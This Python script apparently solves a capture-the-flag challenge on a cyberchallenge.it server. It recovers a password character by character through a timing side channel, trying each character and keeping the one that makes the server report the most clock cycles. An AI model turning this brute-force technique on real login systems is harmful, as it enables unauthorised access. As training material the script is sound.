import subprocess
import string

def send_password(password, cycle):
    # Command to execute the netcat.py script with arguments
    command = ["python3", "netcat.py", "benchmark.challs.cyberchallenge.it", "9031"]

    try:
        # Run the command and capture the output
        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)

        # Send the password as input to the process
        process.stdin.write(password + '\n')
        process.stdin.flush()

        while True:
            # Read the output line by line in real-time
            output_line = process.stdout.readline()

            if output_line == '' and process.poll() is not None:
                # Break if there is no more output and the process has finished
                break

            # Print every line that the script reads
            print(output_line.strip())

            # Check if the line corresponds to the specified pattern
            if "Wrong password, checked in" in output_line and "clock cycles" in output_line:
                # Extract the number 'n' from the line
                n_index = output_line.find("checked in") + len("checked in")
                clock_cycles_index = output_line.find("clock cycles", n_index)
                n = int(output_line[n_index:clock_cycles_index].strip())

                # Print debug info
                print(f"Cycle: {cycle}, Current Password: {password}, Current 'n': {n}")

                # Return the extracted number 'n'
                return n

    except Exception as e:
        print(f"Error executing command: {e}")
    finally:
        if process:
            process.terminate()

# Brute-force attack
charset = string.ascii_letters + string.digits + string.punctuation  # Include uppercase, lowercase, digits, and special characters
password = ""
for cycle in range(40):
    max_n = 0
    best_char = ""

    for char in charset:
        # Try each character and choose the one that leads to the highest 'n'
        current_password = password + char
        current_n = send_password(current_password, cycle + 1)
        
        try:
            if current_n > max_n:
                max_n = current_n
                best_char = char
        except Exception as e:
            print("Final Password:", password)

    # Concatenate the chosen character to the password
    password += best_char


